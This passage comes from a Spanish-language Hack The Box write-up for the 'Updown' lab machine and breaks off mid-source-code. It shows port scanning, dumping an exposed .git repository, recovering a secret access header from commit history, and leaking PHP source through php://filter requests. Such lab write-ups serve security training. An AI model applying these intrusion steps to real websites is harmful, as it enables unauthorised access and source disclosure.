<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox Writeup Updown" /><meta property="og:locale" content="en" /><meta name="description" content="Overwiew" /><meta property="og:description" content="Overwiew" /><link rel="canonical" href="https://e1p0tr0.github.io/posts/HTBUpdown/" /><meta property="og:url" content="https://e1p0tr0.github.io/posts/HTBUpdown/" /><meta property="og:site_name" content="Marss" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-10-23T15:41:16-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackthebox Writeup Updown" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-10-23T15:41:16-05:00","datePublished":"2022-10-23T15:41:16-05:00","description":"Overwiew","headline":"Hackthebox Writeup Updown","mainEntityOfPage":{"@type":"WebPage","@id":"https://e1p0tr0.github.io/posts/HTBUpdown/"},"url":"https://e1p0tr0.github.io/posts/HTBUpdown/"}</script><title>Hackthebox Writeup Updown | Marss</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Marss"><meta name="application-name" content="Marss"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Marss</a></div><div class="site-subtitle font-italic">Freelance Professional [eJPTv2]</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/E1P0TR0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['marsello.guillen','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox Writeup Updown</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Writeup Updown</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Marsello Guillén</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1666557676" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-10-23 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="5711 words"> <em>31 min</em> read</span></div></div></div><div class="post-content"><h1 id="overwiew">Overwiew</h1><ol><li>Access to development page by <strong>information leak in git repository</strong><li>Remote execution of commands by <strong>access to the upload of .phar files</strong><li>Remote execution of commands by <strong>the obsolete version of python in a program</strong> (Foothold)<li>Remote execution of commands by <strong>deprecated program to install packages in python</strong> (Privilege Escalation)</ol><hr /><p><img data-src="/assets/img/htb/writeups/updown/logo.png" alt="Logo" class="shadow" data-proofer-ignore></p><div class="table-wrapper"><table><thead><tr><th style="text-align: center">OS<th style="text-align: center">IP<th style="text-align: center">Release Date<th style="text-align: center">Difficulty<th style="text-align: center">Points<tbody><tr><td style="text-align: center">Linux<td style="text-align: center">10.10.11.177<td style="text-align: center">03 Sep 2022<td style="text-align: center">Medium<td style="text-align: center">30</table></div><hr /><p>Antes de empezar verificamos que estamos conectado a la <strong>VPN</strong> de HTB y tenemos conexión con la máquina:</p><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">&gt;</span> ping <span class="nt">-c1</span> 10.10.11.177
PING 10.10.11.177 <span class="o">(</span>10.10.11.177<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.11.177: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>109 ms
                                          <span class="se">\_</span>_____________________ Linux Machine
<span class="nt">---</span> 10.10.11.177 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
          <span class="se">\_</span>________________<span class="se">\_</span>___________________________________ Successful connection
rtt min/avg/max/mdev <span class="o">=</span> 109.239/109.239/109.239/0.000 ms
</pre></table></code></div></div><blockquote><p>Explicación de parámetros:</p><p>-c &lt;count&gt; : Número de paquetes ICMP que deseamos enviar a la máquina</p></blockquote><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Empezamos con la fase de reconocimiento haciendo un escaneo de tipo <strong>TCP (Transfer Control Protocol)</strong> para descubrir los puertos abiertos de la máquina:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="go">❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.177
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-23 15:53 -05
Nmap scan report for 10.10.11.177
Host is up (0.11s latency).
Not shown: 65288 closed tcp ports (reset), 245 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
              \_________________ Secure Shell Protocol
80/tcp open  http
              \_________________ Hypertext Transfer Protocol
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p- : Escanear todos los puertos, del 1 al 65,535</p><p>–open : Escanear solo puertos abiertos</p><p>-sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo</p><p>--min-rate &lt;number&gt; : Enviar una taza (&lt;number&gt;) de paquetes por segundo como mínimo</p><p>-n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)</p><p>-Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneo</p></blockquote><p>Ahora escaneamos más a fondo para enumerar que servicios corren por detrás de los puertos <strong>22(SSH)</strong> - <strong>80(HTTP)</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="go">Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-23 16:00 -05
Nmap scan report for siteisup.htb (10.10.11.177)
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
</span><span class="gp">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey:
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>Ya que no disponemos de credenciales omitimos el puerto <strong>22(SSH)</strong> y empezamos enumerando el puerto <strong>80(HTTP)</strong>:</p><blockquote><p>Enumeración de tecnologías con <code class="language-plaintext highlighter-rouge">whatweb</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">❯ whatweb 10.10.11.177
http://10.10.11.177 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.177], Title[Is my Website up ?], X-UA-Compatible[chrome=1]
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Si prefieres una herramienta con interfaz mas amigable puedes usar la extensión <a href="https://www.wappalyzer.com/apps/">Wappalyzer</a></p></div></blockquote><blockquote class="prompt-tip"><div><p>Estos escaneos de tecnologías nos sirven para encontrar que aplicaciones/servicios utiliza el servicio web y tener una idea de como se maneja por detrás. También podemos encotrar si su versión en cuestión es vulnerable a diversos ataques web y con ello ahorrarnos tiempo y seguir el paso a la fase de explotación</p></div></blockquote><p>Como no encontramos información interesante recurrimos a examinar la interfaz de la web:</p><blockquote><p>Interfaz web en navegador <code class="language-plaintext highlighter-rouge">chromium</code></p></blockquote><p><img data-src="/assets/img/htb/writeups/updown/web_page.png" alt="10.10.11.177:80" class="shadow" data-proofer-ignore></p><p>Hay una funcionalidad para checkear si una web está activa o caída. De primeras observamos el nombre de dominio <code class="language-plaintext highlighter-rouge">siteisup.htb</code>, como hemos visto antes es posible que se aplique el concepto de <strong>Virtual Hosting</strong>, así que para comprobar eso recurrimos a nuestro archivo del sistema encargado de la <strong>resolución de nombres de dominio y direcciones ip</strong> <em>/etc/hosts</em>: <code class="language-plaintext highlighter-rouge">echo '10.10.11.177 siteisup.htb' &gt;&gt; /etc/hosts</code></p><p>Seguimos observando la misma web, así que empezamos aplicando la técnica <strong>Web Directory Enumeration</strong> para encontrar rutas (directorios/archivos) del servidor web:</p><blockquote><p>Enumeración con script de <code class="language-plaintext highlighter-rouge">nmap</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="go">❯ nmap -p80 --script http-enum --script-args http-enum.basepath=/ 10.10.11.177
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-23 17:29 -05
Nmap scan report for 10.10.11.177
Host is up (0.10s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|_  /dev/: Potentially interesting folder

Nmap done: 1 IP address (1 host up) scanned in 17.95 seconds
</span></pre></table></code></div></div><p>Escaneamos la ruta <code class="language-plaintext highlighter-rouge">/dev</code> usandola como ruta base:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="go">❯ nmap -p80 --script http-enum --script-args http-enum.basepath=/dev 10.10.11.177
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-23 17:29 -05
Nmap scan report for 10.10.11.177
Host is up (0.11s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|_  /dev/.git/HEAD: Git folder

Nmap done: 1 IP address (1 host up) scanned in 13.20 seconds
</span></pre></table></code></div></div><p>Ojito, tenemos un folder <code class="language-plaintext highlighter-rouge">.git</code> el cuál es un <strong>sistema de control de versiones</strong> que usan los desarrolladores al momento de hacer un proyecto. Ahora solo descargamos de manera recursiva dicho folder:</p><blockquote><p>Descarga de repositorio .git con <code class="language-plaintext highlighter-rouge">wget</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">❯ wget -q -r http://10.10.11.177/dev/.git/
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Tambien puedes usar la herramienta <code class="language-plaintext highlighter-rouge">git-dumper</code>: <a href="https://github.com/arthaud/git-dumper">https://github.com/arthaud/git-dumper</a></p></div></blockquote><p>Ya con la información del repositorio <code class="language-plaintext highlighter-rouge">.git</code> empezamos a enumerar y viendo los logs de los commits del proyecto encontramos lo siguiente:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="go">❯ git log --oneline
</span><span class="gp">010dcc3 (HEAD -&gt;</span><span class="w"> </span>main, origin/main, origin/HEAD<span class="o">)</span> Delete index.php
<span class="go">c8fcc40 Update checker.php
f67efd0 Create checker.php
ab9bc16 Update changelog.txt
60d2b32 Create admin.php
c1998f8 Add admin panel.
35a3801 Update changelog.txt
57af03b Create index.php
354fe06 Delete .htpasswd
8812785 New technique in header to protect our dev vhost. &lt;----- Interesting!
bc4ba79 Update .htaccess
61e5cc0 Update index.php
3d66cd4 Create changelog.txt
4fb1927 Create stylesheet.css
6f89af7 Create index.php
8d1beb1 Create .htpasswd
6ddcc7a Create .htaccess
</span></pre></table></code></div></div><blockquote><p>Listamos el log específico</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="go">❯ git show 8812785
commit 8812785e31c879261050e72e20f298ae8c43b565
</span><span class="gp">Author: Abdou.Y &lt;84577967+ab2pentest@users.noreply.github.com&gt;</span><span class="w">
</span><span class="go">Date:   Wed Oct 20 16:38:54 2021 +0200

    New technique in header to protect our dev vhost.

diff --git a/.htaccess b/.htaccess
index 44ff240..b317ab5 100644
--- a/.htaccess
+++ b/.htaccess
@@ -2,3 +2,4 @@ SetEnvIfNoCase Special-Dev "only4dev" Required-Header
 Order Deny,Allow
 Deny from All
 Allow from env=Required-Header
</span></pre></table></code></div></div><p>Vemos que el cambio se hace en el archivo <code class="language-plaintext highlighter-rouge">.htaccess</code> el cuál es un archivo oculto que se utiliza para configurar funciones adicionales para sitios web alojados en el servidor web Apache.</p><p>En este caso con la expresión <strong>SetEnvIfNoCase</strong> esta declarando una variable de entorno llamado <code class="language-plaintext highlighter-rouge">Required-Header</code> basado en la cabezera <code class="language-plaintext highlighter-rouge">Special-Dev</code> que tendrá el valor de <code class="language-plaintext highlighter-rouge">only4dev</code>. Luego de ello se usa la expresión <strong>Allow</strong> para solo permitir el acceso a las peticiones que tengan como cabezera <code class="language-plaintext highlighter-rouge">Special-Dev: only4dev</code> (variable de entorno declarada antes)</p><blockquote class="prompt-info"><div><p>Documentación de la directiva <code class="language-plaintext highlighter-rouge">SetEnvIfNoCase</code>: <a href="https://httpd.apache.org/docs/2.4/mod/mod_setenvif.html#setenvifnocase">https://httpd.apache.org/docs/2.4/mod/mod_setenvif.html#setenvifnocase</a></p></div></blockquote><p>Aparte de ello, en la descripción menciona que <strong>se usa para proteger el vhost dev</strong>, por ello tenemos información de un nuevo dominio y la aplicación del concepto de <strong>Virtual Hosting</strong> que vimos antes. Entonces agregamos el dominio <code class="language-plaintext highlighter-rouge">dev.siteisup.htb</code> a nuestro archivo <em>/etc/hosts</em> y entramos a dicho dominio:</p><p><img data-src="/assets/img/htb/writeups/updown/dev_siteisup_htb.png" alt="dev.siteisup.htb" class="shadow" data-proofer-ignore></p><blockquote class="prompt-warning"><div><p>No olvides interceptar la petición <code class="language-plaintext highlighter-rouge">burpsuite</code> y agregar la cabezera requerida</p></div></blockquote><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Tenemos un sitio web con la misma funcionalidad pero que ahora la lista de sitios web deben estar en un archivo para posteriormente subirlo. Probando subir archivos nos damos cuenta que existen restricciones. Sin embargo, tenemos el repositorio <code class="language-plaintext highlighter-rouge">.git</code> de este proyecto y podemos enumerar los archivos involucrados:</p><blockquote><p>Visualizamos los cambios del proyecto entre commits con <code class="language-plaintext highlighter-rouge">git diff</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="go">❯ git diff
</span><span class="c">...
</span><span class="go">diff --git a/index.php b/index.php
deleted file mode 100644
index 32eeeee..0000000
--- a/index.php
+++ /dev/null
@@ -1,12 +0,0 @@
</span><span class="gp">-&lt;b&gt;</span>This is only <span class="k">for </span>developers&lt;/b&gt;
<span class="gp">-&lt;br&gt;</span><span class="w">
</span><span class="gp">-&lt;a href="?page=admin"&gt;</span>Admin Panel&lt;/a&gt;
<span class="go">-&lt;?php
</span><span class="gp">-       define("DIRECTACCESS",false);</span><span class="w">
</span><span class="gp">-       $</span><span class="nv">page</span><span class="o">=</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'page'</span><span class="o">]</span><span class="p">;</span>
<span class="gp">-       if($</span>page <span class="o">&amp;&amp;</span> <span class="o">!</span>preg_match<span class="o">(</span><span class="s2">"/bin|usr|home|var|etc/i"</span>,<span class="nv">$page</span><span class="o">)){</span>
<span class="gp">-               include($</span>_GET[<span class="s1">'page'</span><span class="o">]</span> <span class="nb">.</span> <span class="s2">".php"</span><span class="o">)</span><span class="p">;</span>
<span class="go">-       }else{
</span><span class="gp">-               include("checker.php");</span><span class="w">
</span><span class="go">-       }
</span><span class="gp">-?&gt;</span><span class="w">
</span><span class="c">...
</span></pre></table></code></div></div><p>Entre todos los archivos este llama la atención ya que es la página principal (index.php) y a primera vista puede ser vulnerable a <strong>Local File Inclusion</strong>. Lamentablemente contiene las restricciones adecuadas, pero igualmente logramos enumerar archivos <code class="language-plaintext highlighter-rouge">.php</code> con su respectivo código de funcionalidad:</p><blockquote><p>Usando el wrapper <code class="language-plaintext highlighter-rouge">php://filter</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="go">❯ curl -s 'http://dev.siteisup.htb/?page=php://filter/convert.base64-encode/resource=index' -H 'Special-Dev: only4dev' | awk 'NR==4' | base64 -d
</span><span class="gp">&lt;b&gt;</span>This is only <span class="k">for </span>developers&lt;/b&gt;
<span class="gp">&lt;br&gt;</span><span class="w">
</span><span class="gp">&lt;a href="?page=admin"&gt;</span>Admin Panel&lt;/a&gt;
<span class="go">&lt;?php
</span><span class="gp">        define("DIRECTACCESS",false);</span><span class="w">
</span><span class="gp">        $</span><span class="nv">page</span><span class="o">=</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'page'</span><span class="o">]</span><span class="p">;</span>
<span class="gp">        if($</span>page <span class="o">&amp;&amp;</span> <span class="o">!</span>preg_match<span class="o">(</span><span class="s2">"/bin|usr|home|var|etc/i"</span>,<span class="nv">$page</span><span class="o">)){</span>
<span class="gp">                include($</span>_GET[<span class="s1">'page'</span><span class="o">]</span> <span class="nb">.</span> <span class="s2">".php"</span><span class="o">)</span><span class="p">;</span>
<span class="go">        }else{
</span><span class="gp">                include("checker.php");</span><span class="w">
</span><span class="go">        }
</span><span class="gp">?&gt;</span><span class="w">
</span></pre></table></code></div></div><p>Observamos que al no especificar por <strong>GET</strong> el parámetro <strong>page</strong>, nos incluye el código del archivo <code class="language-plaintext highlighter-rouge">checker.php</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
</pre><td class="rouge-code"><pre><span class="go">❯ curl -s 'http://dev.siteisup.htb/?page=php://filter/convert.base64-encode/resource=checker' -H 'Special-Dev: only4dev' | awk 'NR==4' | base64 -d
&lt;?php
if(DIRECTACCESS){
</span><span class="gp">	die("Access Denied");</span><span class="w">
</span><span class="go">}
</span><span class="gp">?&gt;</span><span class="w">
</span><span class="gp">&lt;!DOCTYPE html&gt;</span><span class="w">
</span><span class="gp">&lt;html&gt;</span><span class="w">
</span><span class="go">
</span><span class="gp">  &lt;head&gt;</span><span class="w">
</span><span class="gp">    &lt;meta charset='utf-8' /&gt;</span><span class="w">
</span><span class="gp">    &lt;meta http-equiv="X-UA-Compatible" content="chrome=1" /&gt;</span><span class="w">
</span><span class="gp">    &lt;link rel="stylesheet" type="text/css" media="screen" href="stylesheet.css"&gt;</span><span class="w">
</span><span class="gp">    &lt;title&gt;</span>Is my Website up ? <span class="o">(</span>beta version<span class="o">)</span>&lt;/title&gt;
<span class="gp">  &lt;/head&gt;</span><span class="w">
</span><span class="go">
</span><span class="gp">  &lt;body&gt;</span><span class="w">
</span><span class="go">
</span><span class="gp">    &lt;div id="header_wrap" class="outer"&gt;</span><span class="w">
</span><span class="gp">        &lt;header class="inner"&gt;</span><span class="w">
</span><span class="gp">          &lt;h1 id="project_title"&gt;</span>Welcome,&lt;br&gt; Is My Website UP ?&lt;/h1&gt;
<span class="gp">          &lt;h2 id="project_tagline"&gt;</span>In this version you are able to scan a list of websites <span class="o">!</span>&lt;/h2&gt;
<span class="gp">        &lt;/header&gt;</span><span class="w">
</span><span class="gp">    &lt;/div&gt;</span><span class="w">
</span><span class="go">
</span><span class="gp">    &lt;div id="main_content_wrap" class="outer"&gt;</span><span class="w">
</span><span class="gp">      &lt;section id="main_content" class="inner"&gt;</span><span class="w">
</span><span class="gp">        &lt;form method="post" enctype="multipart/form-data"&gt;</span><span class="w">
</span><span class="gp">			    &lt;label&gt;</span>List of websites to check:&lt;/label&gt;&lt;br&gt;&lt;br&gt;
<span class="gp">				&lt;input type="file" name="file" size="50"&gt;</span><span class="w">
</span><span class="gp">				&lt;input name="check" type="submit" value="Check"&gt;</span><span class="w">
</span><span class="gp">		&lt;/form&gt;</span><span class="w">
